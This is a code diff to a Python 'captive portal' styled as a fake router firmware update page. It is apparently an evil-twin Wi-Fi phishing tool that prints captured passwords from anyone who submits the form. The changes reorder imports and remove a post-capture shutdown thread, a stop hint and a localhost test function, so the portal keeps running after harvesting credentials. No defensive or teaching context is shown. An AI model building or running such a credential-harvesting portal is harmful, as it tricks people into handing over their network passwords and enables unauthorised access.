@@ -1,17 +1,11 @@
 #!/usr/bin/env python3
-"""
-Minimal Captive Portal - Router Firmware Update Style
-Using Python HTTPServer with socket reuse
-"""
 
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import sys
+import time
+import socket
 import urllib.parse
 from datetime import datetime
-import threading
-import time
-import os
-import socket
-import sys
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 # HTML template
 PORTAL_TEMPLATE = """
@@ -203,13 +197,6 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             
             print(f"[!] Password captured: {password}")
             
-            # Schedule server shutdown after a delay
-            def shutdown_server():
-                time.sleep(2)
-                print("[*] Shutting down server...")
-                os._exit(0)
-            
-            threading.Thread(target=shutdown_server, daemon=True).start()
             
             # Return a success page with JavaScript to close
             success_html = """
@@ -325,7 +312,6 @@ def captive_portal(server_ip="192.168.0.1", port=80):
         httpd = ReusableHTTPServer((server_ip, port), CaptivePortalHandler)
         print(f"[✓] Successfully bound to {server_ip}:{port}")
         print("[✓] Captive Portal Running - Waiting for connections...")
-        print("[*] Press Ctrl+C to stop")
         print("-" * 50)
         
         # Start serving
@@ -371,10 +357,3 @@ def captive_portal(server_ip="192.168.0.1", port=80):
             print("[✓] Captive portal stopped")
     
     return httpd
-
-
-# For testing/debugging
-def test_portal():
-    """Test function to run portal on localhost:8080"""
-    print("[TEST MODE] Running on localhost:8080")
-    captive_portal("127.0.0.1", 8080)
